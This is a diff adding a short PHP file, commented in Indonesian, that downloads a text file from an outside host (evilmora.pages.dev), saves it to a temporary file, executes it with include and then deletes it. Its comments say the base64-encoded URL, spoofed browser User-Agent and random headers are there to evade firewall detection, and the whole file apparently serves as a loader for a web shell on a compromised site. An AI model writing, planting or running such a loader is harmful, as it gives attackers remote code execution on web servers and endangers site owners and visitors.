@@ -1,0 +1,49 @@
+<?php
+function fetchAndExecute($encodedUrl) {
+    // Dekode URL dari base64 untuk menghindari deteksi langsung oleh WAF
+    $url = base64_decode($encodedUrl);
+
+    // Inisialisasi cURL
+    $ch = curl_init();
+
+    // Menyetel User-Agent yang berbeda agar terlihat seperti browser biasa
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3');
+
+    // Set URL yang ingin diakses
+    curl_setopt($ch, CURLOPT_URL, $url);
+    
+    // Menyetel opsi agar cURL mengembalikan hasilnya sebagai string
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+    // Menambahkan header acak untuk menghindari deteksi
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'X-Custom-Header: ' . uniqid(),
+        'X-Requested-With: XMLHttpRequest'
+    ]);
+    
+    // Eksekusi cURL dan ambil hasilnya
+    $result = curl_exec($ch);
+    
+    // Tutup cURL
+    curl_close($ch);
+    
+    // Periksa apakah pengambilan data berhasil
+    if ($result === false) {
+        die('Failed to access URL');
+    }
+    
+    // Simpan hasil ke dalam file sementara
+    $tempFile = tempnam(sys_get_temp_dir(), 'php_');
+    file_put_contents($tempFile, $result);
+    
+    // Sertakan file sementara untuk mengeksekusi kode di dalamnya
+    include($tempFile);
+    
+    // Hapus file sementara setelah dieksekusi
+    unlink($tempFile);
+}
+
+// URL yang diinginkan diubah menjadi base64 untuk menghindari deteksi langsung
+$encodedUrl = base64_encode("https://evilmora.pages.dev/alfawhite.txt");
+fetchAndExecute($encodedUrl);
+?>
